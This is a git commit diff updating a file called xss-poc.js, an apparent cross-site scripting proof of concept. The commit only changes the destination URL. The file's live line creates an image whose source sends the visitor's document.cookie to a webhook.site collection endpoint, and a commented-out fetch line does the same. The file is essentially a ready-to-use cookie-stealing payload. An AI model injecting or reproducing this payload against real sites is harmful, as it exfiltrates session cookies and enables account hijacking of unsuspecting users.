ad867679c665dfc7f91e4c15cc0473bf4cc50c51
AbdualzizShaibani <101011121+AbdualzizShaibani@users.noreply.github.com>
2023-09-03 00:54:18 +0300

    Update xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -1,3 +1,3 @@
 // fetch("https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?cookie=" + document.cookie);
 
-var i=new Image;i.src="https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?cookie="+document.cookie;
+var i=new Image;i.src="https://webhook.site/8f0a2633-0efc-4696-b50b-c3baeded7dc8/?cookie="+document.cookie;
